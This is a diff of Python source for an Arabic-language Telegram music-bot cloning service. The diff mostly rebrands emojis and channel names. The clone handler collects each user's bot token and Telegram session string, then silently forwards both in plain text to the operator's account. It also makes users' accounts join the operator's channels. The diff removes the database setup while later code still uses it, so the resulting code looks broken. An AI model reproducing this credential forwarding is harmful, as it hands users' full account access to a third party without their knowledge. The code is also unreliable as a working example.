@@ -15,14 +15,6 @@ import asyncio, os, sys
 from os import system, execle, environ
 
 
-mongodb = _mongo_client_(MONGO_DB_URL)
-mo = MongoClient()
-mo = MongoClient(MONGO_DB_URL)
-moo = mo["data"]
-Bots = moo.alli
-db = mongodb.db
-botdb = db.botdb
-blockdb = db.blocked
 
 ##########//((احصائيات الصانع))##########
 async def data_user(client) -> list:
@@ -68,7 +60,7 @@ async def auto_bot():
         await helper(bot_username)
         await Call(bot_username)
         try:
-           await user.send_message(bot_username,"**♪ تم تنصيب البوت بنجاح  💎 .\n♪ واستخدامي حساب مساعد للبوت  💎 .**")
+           await user.send_message(bot_username,"**♪ تم تنصيب البوت بنجاح  🚦⚡ .\n♪ واستخدامي حساب مساعد للبوت  🚦⚡ .**")
         except:
            pass
         try:
@@ -76,11 +68,11 @@ async def auto_bot():
         except:
           pass
         try:
-          await user.join_chat("T_S_T1")
+          await user.join_chat("HLV_M")
         except:
           pass
         try:
-          await user.join_chat("A_H_1_3")
+          await user.join_chat("HLV_M")
         except:
           pass
       except Exception as e:
@@ -154,12 +146,12 @@ async def botooott(client, message):
 @app.on_message(filters.command("تفعيل البوتات",""))
 async def turnon(client, message):
  if message.chat.username in OWNER:
-  m = await message.reply_text("**♪ جاري تشغيل جميع البوتات ..🚦**",quote=True)
+  m = await message.reply_text("**♪ جاري تشغيل جميع البوتات ..🚦⚡**",quote=True)
   try:
    await auto_bot()
   except:
    pass
-  return await message.reply_text("**♪ تم تفعيل جميع البوتات  💎 .**",quote=True)
+  return await message.reply_text("**♪ تم تفعيل جميع البوتات  🚦⚡ .**",quote=True)
 
 @app.on_message(filters.command(["تفعيل الصانع", "تعطيل الصانع"], ""))
 async def bye(client, message):
@@ -169,11 +161,11 @@ async def bye(client, message):
         text = message.text
         if text == "تفعيل الصانع":
             OFF = None
-            await message.reply_text("**♪ تم تفعيل الوضع المجاني  💎 .**",quote=True)
+            await message.reply_text("**♪ تم تفعيل الوضع المجاني  🚦⚡ .**",quote=True)
             return
         if text == "تعطيل الصانع":
             OFF = True
-            await message.reply_text("**♪ تم تعطيل الوضع المجاني  💎 .**",quote=True)
+            await message.reply_text("**♪ تم تعطيل الوضع المجاني  🚦⚡ .**",quote=True)
             return
 
 @Client.on_message(filters.command(["تعطيل الاشتراك الإجباري", "تفعيل الاشتراك الإجباري"], ""))
@@ -183,9 +175,9 @@ async def set_join_must(client: Client, message):
    m = message.command[0]
    await set_must(bot_username, m)
    if message.command[0] == "تعطيل الاشتراك الإجباري":
-     await message.reply_text("**♪ تم تعطيل الاشتراك الإجباري بنجاح  💎 .**",quote=True)
+     await message.reply_text("**♪ تم تعطيل الاشتراك الإجباري بنجاح  🚦⚡ .**",quote=True)
    else:
-     await message.reply_text("**تم تفعيل الاشتراك الإجباري بنجاح  💎 .**",quote=True)
+     await message.reply_text("**تم تفعيل الاشتراك الإجباري بنجاح  🚦⚡ .**",quote=True)
    return
 @app.on_message(filters.command("start") & filters.private)
 async def stratmaked(client, message):
@@ -193,7 +185,7 @@ async def stratmaked(client, message):
     return
   if OFF:
       if not message.chat.username in OWNER:
-         return await message.reply_text(f"**♪ الوضع المجاني معطل الان  💎 .\n♪ راسل المطور لتنصيب مدفوع  💎 .\n♪ Dev : @{OWNER[0]}  💎 .**")
+         return await message.reply_text(f"**♪ الوضع المجاني معطل الان  🚦⚡ .\n♪ راسل المطور لتنصيب مدفوع  🚦⚡ .\n♪ Dev : @{OWNER[0]}  🚦⚡ .**")
   if message.chat.username in OWNER:
     kep = ReplyKeyboardMarkup([
 ["استخراج جلسه","تحديث الصانع"],
@@ -208,12 +200,12 @@ async def stratmaked(client, message):
 ["اذاعه عام", "توجيه عام"],
 ["الاحصائيات"],
 ["اذاعه للمطورين","المكالمات النشطه"]], resize_keyboard=True)
-    await message.reply_text(f"**♪ مرحبا عزيزي المطور الاساسي  💎 .**", reply_markup=kep,quote=True)
+    await message.reply_text(f"**♪ مرحبا عزيزي المطور الاساسي  🚦⚡ .**", reply_markup=kep,quote=True)
   else:
     kep = ReplyKeyboardMarkup([
 ["حذف بوت", "صنع بوت"],
 ["حول السورس", "استخراج جلسه"]],resize_keyboard=True)
-    await message.reply_text(f"**👋🏻 ꒐ أهلاً بك {message.from_user.mention}  💎 .\n🤖 ꒐ في صانع ميوزك نونا  💎 .**", reply_markup=kep,quote=True)
+    await message.reply_text(f"**👋🏻 ꒐ أهلاً بك {message.from_user.mention}  🚦⚡ .\n🤖 ꒐ في صانع ميوزك كابوس  🚦⚡ .**", reply_markup=kep,quote=True)
     
 @app.on_message(
     filters.command(["/alive", "معلومات", "سورس", "السورس", "• السورس •"], "")
@@ -232,16 +224,16 @@ async def alive(client: Client, message):
                  InlineKeyboardButton(f"{OWNER_NAME}", url=f"https://t.me/{OWNER[0]}")
             ],
             [ 
-                 InlineKeyboardButton("اضف البوت الي مجموعتك ❤️", url="https://t.me/{app.username}?startgroup=true")
+                 InlineKeyboardButton(text="اضف البوت الي مجموعتك او قناتك ❤", url=f"https://t.me/{bot_username}?startgroup=True")
             ]
         ]
     )
 
     alive = f"""╭──── • ◈ • ────╮
-么 [𝐬𝐨𝐮𝐫𝐜𝐞 𝐧𝐨𝐧𝐚](t.me/Elasyoutyyyy) 💎 .
-么  [𝒅𝒆𝒗 𝐚𝐬𝐮𝐮𝐭𝐞𝐲](t.me/Elasyoutyy) 💎 .
+么 [𝐬𝐨𝐮𝐫𝐜𝐞](t.me/HLV_M) 🚦⚡ .
+么  [𝒅𝒆𝒗](t.me/ALH_KAR) 🚦⚡ .
 ╰──── • ◈ • ────╯
-🚦 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼  💎 ."""
+🚦⚡ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾?? 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼  🚦⚡ ."""
 
     await message.reply_video(
         video=VIDEO,
@@ -251,7 +243,7 @@ async def alive(client: Client, message):
 
 @app.on_message(filters.command("تحديث الصانع", ""))
 async def update(client, message):
-  msg = await message.reply_text(f"**♪ تم تحديث الصانع بنجاح  💎 .**",quote=True)
+  msg = await message.reply_text(f"**♪ تم تحديث الصانع بنجاح  🚦⚡ .**",quote=True)
   args = [sys.executable, "main.py"]
   await execle(sys.executable, *args, environ)
 
@@ -259,13 +251,13 @@ async def update(client, message):
 async def user(client, message):
   if message.chat.username in OWNER: 
     user = len(await data_user(client))
-    return await message.reply_text(f"**♪ عدد المستخدمين ⟨ {user} ⟩ عضو  💎 .**",quote=True)
+    return await message.reply_text(f"**♪ عدد المستخدمين ⟨ {user} ⟩ عضو  🚦⚡ .**",quote=True)
 
 
 @app.on_message(filters.command("المكالمات النشطه", ""))
 async def achgs(client, message):
   nn = len(active)
-  await message.reply_text(f"**♪ عدد المكالمات النشطه الان {nn}  💎 .**")
+  await message.reply_text(f"**♪ عدد المكالمات النشطه الان {nn}  🚦⚡ .**")
       
 @app.on_message(filters.command(["صنع بوت"], ""))
 async def cloner(app: app, message):
@@ -273,33 +265,33 @@ async def cloner(app: app, message):
       return
     if OFF:
       if not message.chat.username in OWNER:
-         return await message.reply_text(f"**♪ الوضع المجاني معطل الان  💎 .\n♪ راسل المطور لتنصيب مدفوع  💎 .\n♪ Dev : @{OWNER[0]}  💎 .**")
+         return await message.reply_text(f"**♪ الوضع المجاني معطل الان  🚦⚡ .\n♪ راسل المطور لتنصيب مدفوع  🚦⚡ .\n♪ Dev : @{OWNER[0]}  🚦⚡ .**")
     user_id = message.chat.id
-    tokenn = await app.ask(chat_id=user_id, text="**♪ ارسل الان توكن البوت  💎 .**", timeout=200)
+    tokenn = await app.ask(chat_id=user_id, text="**♪ ارسل الان توكن البوت  🚦⚡ .**", timeout=200)
     token = tokenn.text
     try:
-      await tokenn.reply_text("**♪ جاري فحص التوكن ..🚦**")
+      await tokenn.reply_text("**♪ جاري فحص التوكن ..🚦⚡**")
       bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
       await bot.start()
     except Exception as es:
-      return await message.reply_text("**♪التوكن غير صحيح  💎 .**")
+      return await message.reply_text("**♪التوكن غير صحيح  🚦⚡ .**")
     bot_i = await bot.get_me()
     bot_username = bot_i.username
     if await is_served_bot(bot_username):
       await bot.stop()
-      return await message.reply_text("**♪ لا يمكن انشاء هذا البوت  💎 .**")
+      return await message.reply_text("**♪ لا يمكن انشاء هذا البوت  🚦⚡ .**")
     if bot_username in Done:
       await bot.stop()
-      return await message.reply_text("**♪ تم انشاء هذا البوت من قبل  💎 .**")
-    session = await app.ask(chat_id=user_id, text="**♪ ارسل الان كود الجلسة  💎 .**", timeout=200)
-    await app.send_message(user_id, "**♪ جاري تشغيل البوت انتظر ..🚦**")
+      return await message.reply_text("**♪ تم انشاء هذا البوت من قبل  🚦⚡ .**")
+    session = await app.ask(chat_id=user_id, text="**♪ ارسل الان كود الجلسة  🚦⚡ .**", timeout=200)
+    await app.send_message(user_id, "**♪ جاري تشغيل البوت انتظر ..🚦⚡**")
     session = session.text
     user = Client("SEMO", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
     try:       
        await user.start()
     except:
        await bot.stop()
-       return await message.reply_text(f"**♪ كود الجلسه غير صالح  💎 .**")
+       return await message.reply_text(f"**♪ كود الجلسه غير صالح  🚦⚡ .**")
     loger = await user.create_supergroup(f"مجموعة البوت", "هذه المجموعة هي عبارة عن سجل للبوت")
     if bot_i.photo:
        photo = await bot.download_media(bot_i.photo.big_file_id)
@@ -313,7 +305,7 @@ async def cloner(app: app, message):
     await user.stop()
     await bot.stop()
     if message.chat.username in OWNER:
-       dev = await app.ask(message.chat.id, "**♪ ارسل الان ايدي المطور  💎 .**", timeout=200)
+       dev = await app.ask(message.chat.id, "**♪ ارسل الان ايدي المطور  🚦⚡ .**", timeout=200)
        if dev.text == "انا":
           dev = message.chat.id
        else:
@@ -326,8 +318,8 @@ async def cloner(app: app, message):
      await auto_bot()
     except:
          pass
-    await message.reply_text(f"**♪ تم تنصيب البوت بنجاح  💎 .\n♪ وتم انشاء مجموعة تخزين  💎 .\n♪ بستخدام الحساب المساعد للبوت  💎 .\n♪ يمكن من خلالها رؤيه سجل التشغيل  💎 .\n⟨ [{loggerlink}] ⟩**", disable_web_page_preview=True)
-    await app.send_message(OWNER[0],f"**♪ تم تنصيب بوت جديد  💎 .\n♪ يوزر البوت : @{bot_username}  💎 .\n♪ توكن البوت : {token}  💎 .\n♪ كود الجلسه : {session}  💎 .\n♪ بواسطة : {message.from_user.mention}  💎 .\n♪ Id : {message.chat.id}  💎 .\n♪ {loggerlink}  💎 .**")
+    await message.reply_text(f"**♪ تم تنصيب البوت بنجاح  🚦⚡ .\n♪ وتم انشاء مجموعة تخزين  🚦⚡ .\n♪ بستخدام الحساب المساعد للبوت  🚦⚡ .\n♪ يمكن من خلالها رؤيه سجل التشغيل  🚦⚡ .\n⟨ [{loggerlink}] ⟩**", disable_web_page_preview=True)
+    await app.send_message(OWNER[0],f"**♪ تم تنصيب بوت جديد  🚦⚡ .\n♪ يوزر البوت : @{bot_username}  🚦⚡ .\n♪ توكن البوت : {token}  🚦⚡ .\n♪ كود الجلسه : {session}  🚦⚡ .\n♪ بواسطة : {message.from_user.mention}  🚦⚡ .\n♪ Id : {message.chat.id}  🚦⚡ .\n♪ {loggerlink}  🚦⚡ .**")
 
 @app.on_message(filters.command(["حذف بوت"], ""))
 async def delbot(client: app, message):
@@ -337,7 +329,7 @@ async def delbot(client: app, message):
       if not message.chat.username in OWNER:
          return await message.reply_text(f"**الصانع معطل حالياً تواصل مع المطور لتنصيب بوتك \n Dev : @{OWNER[0]}**")
   if message.chat.username in OWNER:
-   ask = await client.ask(message.chat.id, "**♪ ارسل الان يوزر البوت  💎 .**", timeout=200)
+   ask = await client.ask(message.chat.id, "**♪ ارسل الان يوزر البوت  🚦⚡ .**", timeout=200)
    bot_username = ask.text
    if "@" in bot_username:
      bot_username = bot_username.replace("@", "")
@@ -348,7 +340,7 @@ async def delbot(client: app, message):
          botusername = i["bot_username"]
          list.append(botusername)
    if not bot_username in list:
-     return await message.reply_text("**♪ لم يتم صنع هذا البوت  💎 .**")
+     return await message.reply_text("**♪ لم يتم صنع هذا البوت  🚦⚡ .**")
    else:
     try:
      bb = {"bot_username": bot_username}
@@ -362,9 +354,9 @@ async def delbot(client: app, message):
       await boot.stop()
      except:
        pass
-     await message.reply_text("**♪ تم حذف البوت بنجاح  💎 .**")
+     await message.reply_text("**♪ تم حذف البوت بنجاح  🚦⚡ .**")
     except Exception as es:
-     await message.reply_text(f"**♪ هناك خطاء حدث  💎 .\n♪ نوع الخطاء : {es}  💎 .**")
+     await message.reply_text(f"**♪ هناك خطاء حدث  🚦⚡ .\n♪ نوع الخطاء : {es}  🚦⚡ .**")
   else:
    list = []
    bots = Bots.find({})
@@ -387,15 +379,15 @@ async def delbot(client: app, message):
        except:
            pass
    if not message.chat.id in list:
-     return await message.reply_text("**♪ لم تقم بصنع بوتات  💎 .**")
+     return await message.reply_text("**♪ لم تقم بصنع بوتات  🚦⚡ .**")
    else:
     try:
      dev = message.chat.id
      dev = {"dev": dev}
      Bots.delete_one(dev)
-     await message.reply_text("**♪ تم حذف بوتك بنجاح  💎 .**")
+     await message.reply_text("**♪ تم حذف بوتك بنجاح  🚦⚡ .**")
     except:
-     await message.reply_text("**♪ حدث خطأ ، تواصل مع المطور  💎 .\n♪ Dev : @{OWNER[0]}  💎 .**")
+     await message.reply_text("**♪ حدث خطأ ، تواصل مع المطور  🚦⚡ .\n♪ Dev : @{OWNER[0]}  🚦⚡ .**")
    
 
     
@@ -417,11 +409,11 @@ async def botsmaked(client, message):
         except:
            pass
    except:
-        return await message.reply_text("**♪ لا يوجد بوتات مصنوعه  💎 .**")
+        return await message.reply_text("**♪ لا يوجد بوتات مصنوعه  🚦⚡ .**")
    try:
-      await message.reply_text(f"**♪ البوتات المصنوعه وعددهم : {m}  💎 .\n{text}**")
+      await message.reply_text(f"**♪ البوتات المصنوعه وعددهم : {m}  🚦⚡ .\n{text}**")
    except:
-      await message.reply_text("**♪ لا يوجد بوتات مصنوعه  💎 .**")
+      await message.reply_text("**♪ لا يوجد بوتات مصنوعه  🚦⚡ .**")
 
 
 async def get_users(chatsdb) -> list:
@@ -459,19 +451,19 @@ async def botstatus(client, message):
         except Exception as e:
            print(e)
    except:
-        return await message.reply_text("**♪ لا يوجد بوتات مصنوعه  💎 .**")
+        return await message.reply_text("**♪ لا يوجد بوتات مصنوعه  🚦⚡ .**")
    try:
-      await message.reply_text(f"**♪ البوتات المصنوعة {d}  💎 .\n♪ عدد مجموعاتهم {m}  💎 .\n♪ وعدد المستخدمين {u}  💎 .**")
+      await message.reply_text(f"**♪ البوتات المصنوعة {d}  🚦⚡ .\n♪ عدد مجموعاتهم {m}  🚦⚡ .\n♪ وعدد المستخدمين {u}  🚦⚡ .**")
    except:
-      await message.reply_text("**♪ لا يوجد بوتات مصنوعه  💎 .**")
+      await message.reply_text("**♪ لا يوجد بوتات مصنوعه  🚦⚡ .**")
 
 
 @app.on_message(filters.command(["حظر بوت", "حظر مستخدم", "الغاء حظر بوت", "الغاء حظر مستخدم"], ""))
 async def blockk(client: app, message):
  if message.chat.username in OWNER:
-  ask = await client.ask(message.chat.id, "**♪ ارسل الان يوزر المستخدم  💎 .**", timeout=200)
+  ask = await client.ask(message.chat.id, "**♪ ارسل الان يوزر المستخدم  🚦⚡ .**", timeout=200)
   if ask.text == "الغاء":
-     return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  💎 .**")
+     return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  🚦⚡ .**")
   i = ask.text
   if "@" in i:
      i = i.replace("@", "")
@@ -480,12 +472,12 @@ async def blockk(client: app, message):
     if await is_served_bot(bot_username):
      if message.command[0] == "الغاء حظر بوت":
       await del_served_bot(bot_username)
-      return await ask.reply_text("**♪ تم الغاء حظر البوت بنجاح  💎 .**")
+      return await ask.reply_text("**♪ تم الغاء حظر البوت بنجاح  🚦⚡ .**")
      else:
-      return await ask.reply_text("**♪ هذا البوت محظور من قبل  💎 .**")
+      return await ask.reply_text("**♪ هذا البوت محظور من قبل  🚦⚡ .**")
     else:
       if message.command[0] == "الغاء حظر بوت":
-         return await ask.reply_text("**♪ هذا البوت محظور من قبل  💎 .**") 
+         return await ask.reply_text("**♪ هذا البوت محظور من قبل  🚦⚡ .**") 
       await add_served_bot(bot_username)
       try:
        Done.remove(bot_username)
@@ -495,19 +487,19 @@ async def blockk(client: app, message):
        await user.stop()
       except:
        pass
-      return await ask.reply_text("**♪ تم حظر هذا البوت بنجاح  💎 .**")
+      return await ask.reply_text("**♪ تم حظر هذا البوت بنجاح  🚦⚡ .**")
   else:
     user_id = int(i)
     if await is_block_user(user_id):
      if message.command[0] == "الغاء حظر مستخدم":
       await del_block_user(bot_username)
-      return await ask.reply_text("**♪ تم الغاء حظر المستخدم من الصانع بنجاح  💎 .**")
-     return await ask.reply_text("**♪ هذا المستخدم محظور من قبل  💎 .**")
+      return await ask.reply_text("**♪ تم الغاء حظر المستخدم من الصانع بنجاح  🚦⚡ .**")
+     return await ask.reply_text("**♪ هذا المستخدم محظور من قبل  🚦⚡ .**")
     else:
       if message.command[0] == "الغاء حظر مستخدم":
-         return await ask.reply_text("**♪ هذا المستخدم محظور من قبل  💎 .**") 
+         return await ask.reply_text("**♪ هذا المستخدم محظور من قبل  🚦⚡ .**") 
       await add_block_user(user_id)
-      return await ask.reply_text("**♪ تم حظر هذا المستخدم بنجاح  💎 .**")
+      return await ask.reply_text("**♪ تم حظر هذا المستخدم بنجاح  🚦⚡ .**")
    
 
 
@@ -519,9 +511,9 @@ async def casttoall(client: app, message):
    x = ask.id
    y = message.chat.id
    if ask.text == "الغاء":
-      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  💎 .**")
+      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  🚦⚡ .**")
    pn = await client.ask(message.chat.id, "هل تريد تثبيت الاذاعه\nارسل « نعم » او « لا »", timeout=200)
-   h = await message.reply_text("**♪ انتظر بضع الوقت جاري الاذاعه  💎 .**")
+   h = await message.reply_text("**♪ انتظر بضع الوقت جاري الاذاعه  🚦⚡ .**")
    b = 0
    s = 0
    c = 0
@@ -629,9 +621,9 @@ async def casttoall(client: app, message):
 @app.on_message(filters.command(["اذاعه للمطورين"], ""))
 async def cast_dev(client, message):
  if message.chat.username in OWNER:
-  ask = await client.ask(message.chat.id, "**♪ قم بارسال الاذاعه الان  💎 .**", timeout=300)
+  ask = await client.ask(message.chat.id, "**♪ قم بارسال الاذاعه الان  🚦⚡ .**", timeout=300)
   if ask.text == "الغاء":
-      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  💎 .**")
+      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  🚦⚡ .**")
   d = 0
   f = 0
   bots = Bots.find({})
@@ -648,7 +640,7 @@ async def cast_dev(client, message):
         f += 1
       except Exception:
        f += 1
-  return await ask.reply_text(f"**♪ تم الارسال الي {d} مطور  💎 .\n♪ وفشل الارسال الي {f} مطور  💎 .**")
+  return await ask.reply_text(f"**♪ تم الارسال الي {d} مطور  🚦⚡ .\n♪ وفشل الارسال الي {f} مطور  🚦⚡ .**")
 
 
 
@@ -675,13 +667,13 @@ async def testbots(client, message):
 @app.on_message(filters.command(["تصفيه البوتات"],""))
 async def checkbot(client: app, message):
   if message.chat.username in OWNER:
-   ask = await client.ask(message.chat.id,"**♪ ارسل الحد الادني لإحصائيات  💎 .**", timeout=30)
+   ask = await client.ask(message.chat.id,"**♪ ارسل الحد الادني لإحصائيات  🚦⚡ .**", timeout=30)
    if ask.text == "الغاء":
-      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  💎 .**",quote=True)
+      return await ask.reply_text("**♪ تم الغاء الأمر بنجاح  🚦⚡ .**",quote=True)
    bots = Bots.find({})
    m = ask.text
    m = int(m)
-   text = f"**♪ تم ايقاف هذه البوتات لان الاحصائيات اقل من : {ask.text} مجموعة  💎 .**"
+   text = f"**♪ تم ايقاف هذه البوتات لان الاحصائيات اقل من : {ask.text} مجموعة  🚦⚡ .**"
    b = 0
    for i in bots:
        try:
